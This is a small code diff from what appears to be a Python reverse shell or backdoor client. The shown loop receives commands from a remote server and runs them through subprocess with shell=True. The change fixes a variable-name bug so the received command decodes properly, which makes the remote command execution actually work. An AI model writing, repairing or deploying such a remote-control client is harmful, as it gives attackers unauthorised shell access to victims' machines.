@@ -14,7 +14,7 @@ while True:
   print('Connection has been established, awaiting commands from server.')
   #Get commands from the server
   serverCommand = client.recv(1024)
-  serverCommand = command.decode()
+  serverCommand = serverCommand.decode()
   
   #Open command prompt and insert command given by the server
   cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT)
